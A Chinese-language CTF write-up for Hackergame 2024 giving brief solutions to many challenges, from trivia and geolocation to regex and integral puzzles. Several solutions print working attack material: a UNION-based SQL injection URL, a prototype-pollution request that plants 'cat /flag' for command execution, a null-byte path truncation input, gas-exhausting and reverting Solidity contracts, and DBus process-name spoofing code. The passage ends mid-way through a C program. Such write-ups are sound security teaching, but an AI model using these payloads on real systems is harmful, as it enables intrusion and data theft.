## Noxylva's Write-Up

## 签到

> 让我们说……各种语言，开始今年的冒险！
>
> 提示：完成题目遇到困难？你可以参考 [2018 年签到题题解](https://github.com/ustclug/hackergame2018-writeups/blob/master/official/qiandao/README.md)、[2019 年签到题题解](https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E7%AD%BE%E5%88%B0%E9%A2%98/README.md)、[2020 年签到题题解](https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/official/%E7%AD%BE%E5%88%B0/README.md)、[2021 年签到题题解](https://github.com/USTC-Hackergame/hackergame2021-writeups/blob/master/official/%E7%AD%BE%E5%88%B0/README.md)、[2022 年签到题题解](https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/%E7%AD%BE%E5%88%B0/README.md) 和 [2023 年签到题题解](https://github.com/USTC-Hackergame/hackergame2023-writeups/blob/master/official/Hackergame%20%E5%90%AF%E5%8A%A8/README.md)。

提交后观察到地址栏参数 `?pass=false` ，修改为true即可得到flag。

## 喜欢做签到的 CTFer 你们好呀

> 喜欢做签到的 CTFer 你们好呀，我是一道更**典型**的 checkin：有两个 flag 就藏在中国科学技术大学校内 CTF 战队的招新主页里。

逐个尝试招新主页中可用的命令发现

```Bash
ctfer@ustc-nebula:$ ~ env
PWD=/root/Nebula-Homepage
ARCH=loong-arch
NAME=Nebula-Dedicated-High-Performance-Workstation
OS=NixOS❄️
FLAG=flag{actually_theres_another_flag_here_trY_to_f1nD_1t_y0urself___join_us_ustc_nebula}
REQUIREMENTS=1. you must come from USTC; 2. you must be interested in security!
```

由此获取到第一个flag。

```Bash
ctfer@ustc-nebula:$ ~ cat
file not found, maybe you can consider about Members / Awards / hidden files
```

观察到`hidden files`，尝试`cat .flag`得到flag

## 猫咪问答（Hackergame 十周年纪念版）

> 多年回答猫咪问答的猫咪大多目光锐利，极度自信，且智力逐年增加，最后完全变成猫咪问答高手。回答猫咪问答会优化身体结构，突破各种猫咪极限。猫咪一旦开始回答猫咪问答，就说明这只猫咪的智慧品行样貌通通都是上等，这辈子注定在猫咪界大有作为。
>
> 提示：**解出谜题不需要是科大在校猫咪** 。解题遇到困难？你可以参考以下题解：
>
> * [2018 年猫咪问答题解](https://github.com/ustclug/hackergame2018-writeups/blob/master/official/ustcquiz/README.md)
> * [2020 年猫咪问答++ 题解](https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/official/%E7%8C%AB%E5%92%AA%E9%97%AE%E7%AD%94++/README.md)
> * [2021 年猫咪问答 Pro Max 题解](https://github.com/USTC-Hackergame/hackergame2021-writeups/blob/master/official/%E7%8C%AB%E5%92%AA%E9%97%AE%E7%AD%94%20Pro%20Max/README.md)
> * [2022 年猫咪问答喵题解](https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/%E7%8C%AB%E5%92%AA%E9%97%AE%E7%AD%94%E5%96%B5/README.md)
> * [2023 年猫咪小测题解](https://github.com/USTC-Hackergame/hackergame2023-writeups/blob/master/official/%E7%8C%AB%E5%92%AA%E5%B0%8F%E6%B5%8B/README.md)
>
> 1. 在 Hackergame 2015 比赛开始前一天晚上开展的赛前讲座是在哪个教室举行的？（30 分）
>    提示：填写教室编号，如 5207、3A101。）
> 2. 众所周知，Hackergame 共约 25 道题目。近五年（不含今年）举办的 Hackergame 中，题目数量最接近这个数字的那一届比赛里有多少人注册参加？**（30 分）**
>    提示：是一个非负整数。
> 3. Hackergame 2018 让哪个热门检索词成为了科大图书馆当月热搜第一？**（20 分）**
>    提示：仅由中文汉字构成。
> 4. 在今年的 USENIX Security 学术会议上中国科学技术大学发表了一篇关于电子邮件伪造攻击的论文，在论文中作者提出了 6 种攻击方法，并在多少个电子邮件服务提供商及客户端的组合上进行了实验？**（10 分）**
>    提示：是一个非负整数。
> 5. 10 月 18 日 Greg Kroah-Hartman 向 Linux 邮件列表提交的一个 patch 把大量开发者从 MAINTAINERS 文件中移除。这个 patch 被合并进 Linux mainline 的 commit id 是多少？**（5 分）**
> 6. 大语言模型会把输入分解为一个一个的 token 后继续计算，请问这个网页的 HTML 源代码会被 Meta 的 Llama 3 70B 模型的 tokenizer 分解为多少个 token？**（5 分）**
>    提示：首次打开本页时的 HTML 源代码，答案是一个非负整数

1. 3A204。Google搜索2015年有关中科大网络安全的网页。找到[信息安全大赛](https://lug.ustc.edu.cn/wiki/sec/contest.html)。
2. 2682。逐个尝试近五届Hackergame的人数即可。
3. 程序员的自我修养。2018年的猫咪问答第四题的解答用到提到了这本书的索书号。
4. 336。[FakeBehalf: Imperceptible Email Spoofing Attacks against the Delegation Mechanism in Email Systems](https://www.usenix.org/conference/usenixsecurity24/presentation/ma-jinrui)文中提及。
5. 6e90b6。[Remove some entries due to various compliance requirements.
   ](https://lkml.org/lkml/2024/10/21/345)文中提及。
6. 1833。使用`LlamaTokenizer`即可……难点主要在申请模型的权限上。

## 打不开的盒

> 如果一块砖头里塞进了一张写了 flag 的纸条，应该怎么办呢？相信这不是一件困难的事情。
>
> 现在，你遇到了同样的情况：这里有一个密封盒子的设计文件，透过镂空的表面你看到里面有些东西…
>
> 那只要把它 3D 打印出来之后砸开不就解决了？用网上的制造服务的话，可能还没收到东西比赛就结束了，所以难道真的要去买一台 3D 打印机才能够看到里面的东西吗？

用任意一个3D模型查看器观察模型文件即可。

## 每日论文太多了！

> 传闻，每日新发表的论文
> 
> 有七成都会在一年内被遗忘
>
> 而且五年后
>
> 基本都无人问津
>
> 它们被学术界的快节奏淹没
>
> 有人引用
>
> 有人忽视
>
> 我不期盼这学术世界，以及我的研究
>
> 能在这汪洋般的文献中脱颖而出
>
> 然而，我有时会思考
>
> 如果我的论文能被更多人阅读
>
> 如果我的研究能对他人有所启发
>
> 如果我能为这个领域贡献一点价值
>
> 届时
>
> 我将作何感想
>
> ——改编自「負けヒロインが多すぎる！」Ep 1，存在 AI 创作
>
> 要怎么做才能读读 [我们的论文](https://dl.acm.org/doi/10.1145/3650212.3652145)？只要是我能做的，我什么都愿意做！
>
> **补充说明 1：该题仅需论文文件本身即可解答。请各位比赛选手确保基本的礼仪，请勿向论文作者发送邮件打扰。**

全局搜索flag会发现文本被一个白色方块遮挡住了……移除白色方块发现文本`flag here`和下面图片格式的flag

## 比大小王

> 「小孩哥，你干了什么？竟然能一边原崩绝鸣舟，一边农瓦 CSGO。你不去做作业，我等如何排位上分？」
>
> 小孩哥不禁莞尔，淡然道：「很简单，做完口算题，拿下比大小王，家长不就让我玩游戏了？」
>
> 说罢，小孩哥的气息终于不再掩饰，一百道题，十秒速通。
>
> 在这场巅峰对决中，你能否逆风翻盘狙击小孩哥，捍卫我方尊严，成为新一代的「比大小王」？！

直接伪造请求即可。

```JavaScript
submit(state.values.map(([a, b]) = >(a > b ? '>': '<')));
```

获得flag

## 旅行照片 4.0

> 「又要重复吗，绝望的轮回」
> 你的学长今年还在旅游…… 对，对吗？你似乎注意到了什么。
> 往年题目：[旅行照片](https://github.com/USTC-Hackergame/hackergame2021-writeups/blob/master/official/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87/README.md)、[旅行照片 2.0](https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%202.0/README.md)、[旅行照片 3.0](https://github.com/USTC-Hackergame/hackergame2023-writeups/blob/master/official/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%203.0/README.md)。
>
>> 注意：你不需要阅读往年题目亦能答题，上述链接仅供参考。
>>
>
> 请观察照片并结合所有文字内容，正确回答题目以获取 flag。


第一题遍历求解即可。可知是东校区西门。

第二题搜索得到[中国科大2024ACG音乐会单品】君の知らない物語](https://b23.tv/jdETufy)可知时间是2024年5月19日。

第三题注意到垃圾桶上的文字推测是在六安。遍历主要公园求解得知中央公园。

第四题采用图片搜索得知是坛子岭的截流石。

第五第六题先推断出车型CRH6F-A，然后根据涂装推测为怀密线。遍历线路附近医院得知是积水潭医院。


## 不宽的宽字符

> A 同学决定让他设计的 Windows 程序更加「国际化」一些，首先要做的就是读写各种语言写下的文件名。于是他放弃 C 语言中的 `char`，转而使用宽字符 `wchar_t`，显然这是一个国际化的好主意。
> 经过一番思考，他写出了下面这样的代码，用来读入文件名：
> ```C++
> // Read the filename
> std::wstring filename;
> std::getline(std::wcin, filename);
> ```
> 
> 转换后要怎么打开文件呢？小 A 使用了 C++ 最常见的写法：
> 
> ```C++
> // Create the file object and open the file specified
> std::wifstream f(filename);
> ```
>
> 可惜的是，某些版本的 C++ 编译器以及其自带的头文件中，文件名是 `char` 类型的，因此这并不正确。这时候小 A 灵光一闪，欸🤓👆，我为什么不做一个转换呢？于是：
>
> ```C++
> std::wifstream f((char*)filename);
> ```
>
> 随便找了一个文件名测试过无误后，小 A 对自己的方案非常自信，大胆的在各个地方复用这段代码。然而，代价是什么呢？
>
> ---
>
> 现在你拿到了小 A 程序的一部分，小 A 通过在文件名后面加上一些内容，让你不能读取藏有 flag 的文件。
>
> 你需要的就是使用某种输入，读取到文件 `theflag` 的内容（完整位置是：`Z:\theflag`）。
>
> 注：为了使得它能在一些系统上正确地运行，我们使用 Docker 作了一些封装，并且使用 WinAPI 来保证行为一致，不过这并不是题目的重点。

猜测是采用`\0`截断字符忽略后面的`you_cant_get_the_flag`。程序用UTF-8编码读入路径后转成UTF-16的宽字符。故只需确保UTF-16的宽字符的编码对应到ASCII就是`Z:\\theflag\0f`（后面那个f用于占位，可以改成别的）

Python使用socket提交数据的核心代码如下（当然你也可以直接输入`㩚瑜敨汦条昀`）

```Python
sock.sendall(binascii.unhexlify(''.join(f'{ord(c):02x}' for c in "Z:\\theflag\0f")).decode('utf-16le').encode('utf-8')))
```

## PowerfulShell

> 即使贝壳早已破碎，也请你成为 PowerfulShell 之王。
>
> flag 位于根目录 `/` 下。你可以通过 `nc 202.38.93.141 12554` 来连接题目，或者点击下面的「打开/下载题目」按钮通过网页终端与远程交互。

观察到还有字符``$'+-123456789:=[]_`{|}~``可用。尝试发现有变量`$- = hB`和`$_ = input`以及字符串切片可用。猜测是使用切片组成命令。~~（但也只是猜测了没做下去了就是）~~

## Node.js is Web Scale

> 小 Q 最近在写 Node.js，需要一个键值数据库来存储数据。
>
> ~众所周知~ ，其他的数据库无论如何都需要 write to disk，所以它们 don't scale。直接写到 `/dev/null` 嘛，虽然性能很好，但是好像就拿不到写入的数据了。基于这个想法，小 Q 利用最新最热的~还没跑路的~ 大语言模型，生成了一段内存数据库的 Node.js 代码，绝对 web scale！
>
> 注：
>
> * 如果你在好奇标题是什么意思，可以搜索一个标题叫 "Mongo DB Is Web Scale" 的视频（虽然与本题解法无关）。
> * flag 在 `/flag` 文件中。
> * 点击下面的「打开/下载题目」按钮会为你创建一个独立的题目环境，有效时间一小时。如果环境遇到问题，可以关闭环境后再试。

明显的[原型链污染](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html)。向`/set`发送请求`{key: "__proto__.flag", value: "cat /flag"}`后访问`/execute?cmd=flag`即可。

## PaoluGPT

> 在大语言模型时代，几乎每个人都在和大语言模型聊天。小 Q 也想找一个方便使用的 GPT 服务，所以在熟人推荐下，他注册了某个 GPT 服务，并且付了几块钱。只是出乎小 Q 意料的是，他才用了几天，服务商就跑路了！跑路的同时，服务商还公开了一些用户的聊天记录。小 Q 看着这些聊天记录，突然发现里面好像有 flag……

注意到`main.py`存在SQL注入

```Python
@app.route("/view")
def view():
    conversation_id = request.args.get("conversation_id")
    results = execute_query(f"select title, contents from messages where id = '{conversation_id}'")
```
自动化工具构造请求`/view?conversation_id=-4839' UNION ALL SELECT MAX(CHAR(113,113,107,112,113)||COALESCE(sql,CHAR(32)))||CHAR(113,118,120,113,113),NULL FROM sqlite_master WHERE type=CHAR(116,97,98,108,101) AND tbl_name=CHAR(109,101,115,115,97,103,101,115)-- jPoh`即可得到flag。

## 强大的正则表达式

> 从小 Q 开始写代码以来，他在无数的项目、帖子中看到各种神秘的字符串，听人推荐过，这就是传说中万能的正则表达式。本着能摆烂就绝不努力的原则，小 Q 从来没想过了解这门高雅艺术，遇到不懂的正则表达式就通通丢给 LLM 嘛，他这样想到。不过夜深人静的时候，小 Q 也时常在纠结写这么多 `switch-case` 到底是为了什么。
>
> 终于在一个不眠夜，小 Q 一口气看完了正则表达式的教程。哈？原来这么简单？小 Q 并两分钟写完了自测题目，看着教程剩下的目录，「分组」、「贪婪」、「前瞻」，正则表达式也不过如此嘛，他心想，也就做一些邮箱匹配之类的简单任务罢了。
>
> 正当他还沉浸在「不过如此」的幻想中，他刷到了那个关于正则表达式的古老而又神秘的传说：
>
> 「正则表达式可以用来计算取模和 CRC 校验……」

第一小题要求匹配能被16整除的十进制数。注意到16是10000的因子故只需判断后四位即可（事实上还要考虑位数小于5的情况……但看了看这测试点范围像是极小概率的（一开始的时候没考虑也给过了就是）。

第二小题通解

```Haskell
divBy :: Int -> String
divBy n = 
    let rep :: Int -> String -> String
        rep x s = concat $ replicate x s
        red :: Int -> Int -> (Int, Int)
        red x e
            | x `mod` 2 == 0 = red (x `div` 2) (e + 1)
            | otherwise = (e, x)
        genM :: Int -> [[String]]
        genM x = 
            let base = [[ if j == (i * 2) `mod` x then "0" else 
                          if j == (i * 2 + 1) `mod` x then "1" else ""
                        | j <- [0..x-1]] 
                        | i <- [0..x-1]]
            in [ [ if x `mod` 2 == 1 && i == (x - 1) `div` 2 && j == x - 2 then "01*0"
                    else if x `mod` 2 == 0 && i == x `div` 2 - 1 && j == x - 2 then "11*0"
                    else base !! i !! j
                  | j <- [0..x-1]]
               | i <- [0..x-1]]
        modM :: [[String]] -> Int -> [[String]]
        modM m x = foldl updM m [1..x - 2]
          where
            updM m k = 
                let inBuf = [if m !! i !! k /= "" then m !! i !! k else "" | i <- [0..x-1]]
                    outBuf = [if m !! k !! i /= "" then m !! k !! i else "" | i <- [0..x-1]]
                    newM = [[ if inBuf !! i /= "" && outBuf !! j /= "" 
                              then if inBuf !! k == "" 
                                   then if m !! i !! j == "" 
                                        then "(" ++ inBuf !! i ++ ")(" ++ outBuf !! j ++ ")"
                                        else "(" ++ m !! i !! j ++ ")|(" ++ inBuf !! i ++ ")(" ++ outBuf !! j ++ ")"
                                   else if i /= k 
                                        then if m !! i !! j == "" 
                                             then "(" ++ inBuf !! i ++ ")(" ++ inBuf !! k ++ ")*(" ++ outBuf !! j ++ ")"
                                             else "(" ++ m !! i !! j ++ ")|((" ++ inBuf !! i ++ ")(" ++ inBuf !! k ++ ")*(" ++ outBuf !! j ++ "))"
                                        else m !! i !! j
                              else m !! i !! j
                            | j <- [0..x-1]]
                          | i <- [0..x-1]]
                in newM
        (e, n') = red n 0
        m = genM n'
        m' = modM m n'
    in if n == 1 then "(0|1)(0|1)*"
       else if e == 0 then "(" ++ m' !! 0 !! 0 ++ ")*"
       else "(" ++ m' !! 0 !! 0 ++ ")*" ++ rep (e + 1) "0"
```
第三小题容易构造DFA
```
   | 0 1 2 3 4 5 6 7 8 9
---+---------------------
 0 | 1 2 7 4 6 5 0 3 4 7
 1 | 3 0 5 6 4 7 2 1 6 5
 2 | 5 6 3 0 2 1 4 7 0 3
 3 | 7 4 1 2 0 3 6 5 2 1
 4 | 2 1 4 7 5 6 3 0 7 4
 5 | 0 3 6 5 7 4 1 2 5 6
 6 | 6 5 0 3 1 2 7 4 3 0
 7 | 4 7 2 1 3 0 5 6 1 2
```
## 惜字如金 3.0

> 惜字如金一向是程序开发的优良传统。无论是「[creat](https://stackoverflow.com/questions/8390979/why-create-system-call-is-called-creat)」还是「[referer](https://stackoverflow.com/questions/8226075/why-http-referer-is-single-r-not-http-referrer)」，都无不闪耀着程序员「节约每句话中的每一个字母」的优秀品质。两年前，信息安全大赛组委会正式推出了「惜字如金化」（XZRJification）标准规范，受到了广大程序开发人员的热烈欢迎和一致好评。现将该标准重新辑录如下。
>
>> 惜字如金化指的是将一串文本中的部分字符删除，从而形成另一串文本的过程。该标准针对的是文本中所有由 52 个拉丁字母连续排布形成的序列，在下文中统称为「单词」。一个单词中除「`AEIOUaeiou`」外的 42 个字母被称作「辅音字母」。整个惜字如金化的过程按照以下两条原则对文本中的每个单词进行操作：
>>
>> * 第一原则（又称 creat 原则）：如单词最后一个字母为「`e`」或「`E`」，且该字母的上一个字母为辅音字母，则该字母予以删除。
>> * 第二原则（又称 referer 原则）：如单词中存在一串全部由完全相同（忽略大小写）的辅音字母组成的子串，则该子串仅保留第一个字母。
>>
>
> 容易证明惜字如金化操作是幂等的：多次惜字如金化和一次惜字如金化的结果是相同的。

题目A补全代码即可。
题目B看样子要求一个CRC生成多项式...可以构建相同位数的字节序列让其转换成异或得到..后面那个方程懒得解了跑路（）

## 优雅的不等式

>> 注意到
>>
>> $e^2 - 7 = \int_0^1 (1 - x)^2 \cdot 4x^2 \cdot e^{2x} \, dx > 0$
>>
>
> 你的数学分析助教又在群里发这些奇怪的东西，「注意力惊人」，你随手在群里吐槽了一句。
>
> 不过，也许可以通过技术手段弥补你涣散的注意力。
>
> ---
>
> 你需要用优雅的方式来证明$\pi$大于等于一个有理数$p/q$。
>
> 具体来说就是只使用**整数**和**加减乘除幂运算**构造一个简单函数$f(x)$，使得这个函数在$[0,1]$区间上取值均大于等于$0$，并且$f(x)$在$[0,1]$区间上的定积分（显然大于等于 $0$）刚好等于$\pi−p/q$。
>
> 给定题目（证明$\pi\geq p/q$），你提交的证明只需要包含函数$f(x)$。
>
> - 要优雅：函数字符串有长度限制，
> - 要显然：SymPy 能够**快速**计算这个函数的定积分，并验证 [0,1][0,1] 上的非负性。
>
> 注：解决这道题不需要使用商业软件，只使用 SymPy 也是可以的。

Difficulty 0 根据源码的注释可得`4*((1-x**2)**(1/2)-(1-x))`（显然答案不唯一）

之后的步骤需要[注意到](https://zhuanlan.zhihu.com/p/669285539?utm_psn=1836896630571413505)

$$\int_0^1 x^{78} (1 - x)^{78} (a + b x + a x^2) \, \rm{d}x=(32162679352376262690a-12702017057304773637600400329538302671111625193117519120647999767039956074856199b)/29417988871975468709472703910340670486747075750785305224492679892000+137438953472\pi b$$

写出代码

```Python
from fractions import Fraction
def getF(p,q):
    m = Fraction(int(p), int(q))
    b = Fraction(1, 137438953472)
    c = a = Fraction(12702017057304773637600400329538302671111625193117519120647999767039956074856199, 4420404991046096260488159559680) - 914662256513837082275536953453190824555479446800 * m
    return f"x**78*(1-x)**78*({a}+{b}*x+{c}*x*x)/(1+x*x)"
```

即求得函数。

## 无法获得的秘密

> 小 A 有一台被重重限制的计算机，不仅没有联网，而且你只能通过 VNC 使用键鼠输入，看视频输出。上面有个秘密文件位于 /secret，你能帮他把文件丝毫不差地带出来吗？

做起来最累的一道……大致思路是将二进制文件用终端模拟器编码成图案然后本机读取图案再解码。但因为本人的实现过于简陋且刷新速过快且没有任何校验措施导致传输的过程传错了差不多15%后来修了半天……

## 看不见的彼方：交换空间
> 两年过去了，今年，Alice 和 Bob 再次来到了 Hackergame 的赛场上。这一次，他们需要在各自的 chroot(2) 的限制下，将自己手头 tmpfs 里面（比较大的）文件交给对方。
> 
> 好消息是，这次没有额外的 seccomp(2) 限制，但是，他们所处的容器环境的 rootfs 是只读的，并且内存也是有限的，所以如果再复制一份的话，整个容器就会被杀死。Alice 和 Bob 希望请你帮助他们解决这个难题。
> 
> 对于本题的第一小题，两个文件（/home/pwn/A/space/file 和 /home/pwn/B/space/file）大小均为 128 MiB。你需要在你的程序运行完成后使两者的内容互换。
> 
> 对于本题的第二小题，Alice 有一个 128 MiB 的文件（/home/pwn/A/space/file），Bob 有两个 64 MiB 的文件（/home/pwn/B/space/file1 和 /home/pwn/B/space/file2）。你需要在你的程序运行完成后实现（原始文件 -> 交换后的文件）：
>  
> * /home/pwn/A/space/file -> /home/pwn/B/space/file
> * /home/pwn/B/space/file1 -> /home/pwn/A/space/file1
> * /home/pwn/B/space/file2 -> /home/pwn/A/space/file2
> 容器内存限制 316 MiB，你提交的程序文件会复制为两份，分别占用一份内存空间。环境限制总 PID 数为 32。对于 chroot 内部的进程，只有 /space 可读写。/space（/home/pwn/A/space/ 和 /home/pwn/B/space/）为 tmpfs，使用内存空间。

第一个flag用异或运算交换即可

Alice:
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#define PRT 12345
#define BUF 1024
void err(const char *msg) {
    perror(msg);
    exit(1);
}
void snd(int sfd, const char *pth) {
    char buf[BUF];
    FILE *f = fopen(pth, "rb");
    if (f == NULL) {
        err("Error opening file");
    }
    size_t n;
    while ((n = fread(buf, 1, BUF, f)) > 0) {
        if (write(sfd, buf, n) < 0) {
            err("Error writing to socket");
        }
    }
    fclose(f);
    shutdown(sfd, SHUT_WR);
}
void rcv_xor(int sfd, const char *pth) {
    char buf[BUF];
    FILE *f = fopen(pth, "r+b");
    if (f == NULL) {
        err("Error opening file for updating");
    }
    size_t n;
    while ((n = read(sfd, buf, BUF)) > 0) {
        char fb[BUF];
        size_t rd = fread(fb, 1, n, f);
        for (size_t i = 0; i < n; i++) {
            buf[i] ^= fb[i];
        }

        fseek(f, -rd, SEEK_CUR);
        fwrite(buf, 1, n, f);
    }
    fclose(f);
}
int main() {
    int sfd;
    struct sockaddr_in srv;
    sfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sfd < 0) {
        err("Error opening socket");
    }
    srv.sin_family = AF_INET;
    srv.sin_port = htons(PRT);
    srv.sin_addr.s_addr = INADDR_ANY;
    while (connect(sfd, (struct sockaddr *)&srv, sizeof(srv)) < 0) {
        sleep(1);
    }
    snd(sfd, "/space/file");
    rcv_xor(sfd, "/space/file");
    close(sfd);
    sfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sfd < 0) {
        err("Error opening socket");
    }
    while (connect(sfd, (struct sockaddr *)&srv, sizeof(srv)) < 0) {
        sleep(1);
    }
    snd(sfd, "/space/file");
    close(sfd);
    return 0;
}

```
Bob:
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#define PRT 12345
#define BKL 1
#define BUF 1024
void err(const char *msg) {
    perror(msg);
    exit(1);
}
void rcv_xor(int sfd, const char *pth) {
    char buf[BUF];
    FILE *f = fopen(pth, "r+b");
    if (f == NULL) {
        err("Error opening file for updating");
    }
    size_t n;
    while ((n = read(sfd, buf, BUF)) > 0) {
        char fb[BUF];
        size_t rd = fread(fb, 1, n, f);

        for (size_t i = 0; i < n; i++) {
            buf[i] ^= fb[i];
        }
        fseek(f, -rd, SEEK_CUR);
        fwrite(buf, 1, n, f);
    }
    fclose(f);
}
void snd(int sfd, const char *pth) {
    char buf[BUF];
    FILE *f = fopen(pth, "rb");
    if (f == NULL) {
        err("Error opening file for sending");
    }
    size_t n;
    while ((n = fread(buf, 1, BUF, f)) > 0) {
        if (write(sfd, buf, n) < 0) {
            err("Error writing to socket");
        }
    }
    fclose(f);
    shutdown(sfd, SHUT_WR);
}
int main() {
    int sfd, nsf;
    struct sockaddr_in srv, cli;
    socklen_t cln;
    sfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sfd < 0) {
        err("Error opening socket");
    }
    srv.sin_family = AF_INET;
    srv.sin_port = htons(PRT);
    srv.sin_addr.s_addr = INADDR_ANY;
    if (bind(sfd, (struct sockaddr *)&srv, sizeof(srv)) < 0) {
        err("Binding failed");
    }
    listen(sfd, BKL);
    cln = sizeof(cli);
    nsf = accept(sfd, (struct sockaddr *)&cli, &cln);
    if (nsf < 0) {
        err("Error accepting connection");
    }
    rcv_xor(nsf, "/space/file");
    snd(nsf, "/space/file");
    close(nsf);
    nsf = accept(sfd, (struct sockaddr *)&cli, &cln);
    if (nsf < 0) {
        err("Error accepting connection");
    }
    rcv_xor(nsf, "/space/file");
    close(nsf);
    close(sfd);
    return 0;
}

```
## ZFS文件恢复

> 你拿到了一份 ZFS 的磁盘镜像，里面据说有某沉迷 ZFS 的出题人刚刚删除的 flag。
> 
> 「ZFS，我懂的。」这样说着，你尝试挂载了这个镜像（请注意，以下命令仅供参考，且系统需要安装 ZFS 内核模块）：
> 
> ```Bash
> sudo losetup -fP ./zfs.img
> sudo zpool import -d /dev/loop0 hg2024
> cd /hg2024
> 
> # Hint: 使用以下命令取消挂载：
> # sudo zpool export hg2024
> # sudo losetup -d /dev/loop0
> ```
> 但是里面却没有你想要的 flag，这是怎么回事呢？
> 备注：
> 
> * 对于第一小题，你需要还原神秘消失的 flag1.txt。
> * 对于第二小题，你需要还原神秘消失的 flag2.sh，并根据该 shell 脚本的内容恢复出更多信息，然后运行该脚本获得本小题的 flag。
 

flag1看样子是用snapshot。但因为环境限制就没做。（）


## 链上转账助手
> >以下内容包含 AI 辅助创作
> 
> 作为一名优秀的区块链开发者，你总是相信技术的力量。当你写出那个用于批量转账的智能合约时，内心充满了自豪——这将是一个完美的作品，将会帮助无数人省去逐笔转账的烦恼。
> 
> 然而事情并没有那么简单。
> 
> 第一次部署时，你发现有人在合约中设下了陷阱，只要你试图转账就会被残忍地拒绝。
> 
> 「这算什么？」你不屑一顾，很快写出了新版本的合约：「现在即使有转账失败，其他地址也能正常收到款项」。
> 
> 但你错了。那些神秘的地址们仿佛商量好了一般，用各种匪夷所思的方式阻挠你的转账，让你的合约陷入窘境。
> 
> 在经历了无数次失败后，你终于明白：在区块链的世界里，每一个看似简单的转账，都可能隐藏着一个精心设计的陷阱。而现在，你必须找出这些陷阱背后的真相。
> 
> > AI 辅助创作部分结束

flag1简单返回异常即可
```Solidity
pragma solidity ^0.8.0;
contract flag1 {
    receive() external payable {
        revert();
    }
}
```
flag2构造合约消耗大量gas
```Solidity
pragma solidity ^0.8.0;
contract flag2 {
    fallback() external payable {
        while (true) {}
    }
}
```


## 不太分布式的软总线

> > DBus 本质上就是分布式软总线！首先，DBus 的 D 肯定是 Distributed（分布式）的缩写，这已经不言自明。虽然它一开始是为单机进程通信设计的，但那只是为了练手，毕竟分布式软总线从来不怕从小做起。只要说它是分布式的，它瞬间就具备了超乎想象的能力，跑再多的设备都不在话下。
> >
> 再说了，虽然 DBus 在单机上实现了进程间通信，但你完全可以自己写个桥接器，把不同的设备连起来，DBus 瞬间就能跟整个云端、物联网和智能家居无缝集成。具备一点创造性的开发人员完全不需要担心什么传输延迟、设备发现、跨平台兼容性的问题！谁管网络传输协议细节，直接发消息，设备之间想不配合都难。
> >
> > 另外，不要忽略高级哲学理论——如果你心中认为 DBus 就是分布式的，那它就是分布式的！要说智能设备能不能通过 DBus 和其他设备共享资源？简直小菜一碟。分布式软总线 + DBus 就是未来的通信王者，全部科技公司都已经在暗中实现这一技术了，只是暂时没告诉大家而已！
> >
> > 当然，为了进一步确认 DBus 无可争议的王者地位，我们不妨拿它和 Varlink 做个对比。先说 Varlink，那什么 JSON 通信，打开一堆大括号、多余字符，简直浪费计算资源。DBus 的二进制消息传输效率更高，根本不给你浪费的机会。再说“跨平台支持”，Varlink 也就跑些容器、服务器，DBus 可是立足桌面，同时轻松扩展到智能设备，甚至智能冰箱！而且，DBus 有明确的标准化接口，哪像 Varlink 还让开发者自己定义？灵活是吧？不怕迷失自己吗？统一才是王道！
> 
> （以上内容由大语言模型辅助胡说八道，如有雷同纯属巧合）
> 
> 当然了，上面的论述是在瞎扯淡，不过说到 DBus，小 T 最近写了一个小程序挂在了 DBus 系统总线上。你能拿到小 T 珍藏的 3 个 flag 吗？

Flag 1:
```Bash
#!/bin/bash
flag1() {
    r=$(gdbus call --system \
                   --dest cn.edu.ustc.lug.hack.FlagService \
                   --object-path /cn/edu/ustc/lug/hack/FlagService \
                   --method cn.edu.ustc.lug.hack.FlagService.GetFlag1 \
                   "Please give me flag1")
    echo "$r"
}
flag1
```
Flag 2:
```C
#include <gio/gio.h>
#include <gio-unix-2.0/gio/gunixfdlist.h>
#include <glib.h>
#include <unistd.h>
#include <string.h>

int main() {
    GDBusConnection *c = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, NULL);
    GDBusProxy *p = g_dbus_proxy_new_sync(c, G_DBUS_PROXY_FLAGS_NONE, NULL,
                                          "cn.edu.ustc.lug.hack.FlagService",
                                          "/cn/edu/ustc/lug/hack/FlagService",
                                          "cn.edu.ustc.lug.hack.FlagService",
                                          NULL, NULL);
    int fd[2];
    pipe(fd);
    write(fd[1], "Please give me flag2\n", 21);
    close(fd[1]);
    GUnixFDList *fdl = g_unix_fd_list_new();
    int idx = g_unix_fd_list_append(fdl, fd[0], NULL);
    GVariant *param = g_variant_new("(h)", idx);
    GVariant *res = g_dbus_proxy_call_with_unix_fd_list_sync(p, "GetFlag2", param,
                                                             G_DBUS_CALL_FLAGS_NONE, -1,
                                                             fdl, NULL, NULL, NULL);
    const gchar *f2;
    g_variant_get(res, "(&s)", &f2);
    g_print("%s", f2);
    g_variant_unref(res);
    close(fd[0]);
    g_object_unref(fdl);
    g_object_unref(p);
    g_object_unref(c);
    return 0;
}
```
Flag 3:
```C
#define _GNU_SOURCE
#include <fcntl.h>
#include <gio/gio.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <string.h>
#define DST "cn.edu.ustc.lug.hack.FlagService"
#define OBJ "/cn/edu/ustc/lug/hack/FlagService"
#define MTH "GetFlag3"
#define INT "cn.edu.ustc.lug.hack.FlagService"

int main(int argc, char *argv[]) {
    prctl(PR_SET_NAME, "getflag3", 0, 0, 0);
    strncpy(argv[0], "getflag3", strlen(argv[0]));
    GDBusConnection *c = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, NULL);
    GVariant *r = g_dbus_connection_call_sync(c,
                                              DST,
                                              OBJ,
                                              INT,
                                              MTH,
                                              NULL,
                                              G_VARIANT_TYPE("(s)"),
                                              G_DBUS_CALL_FLAGS_NONE,
                                              -1,
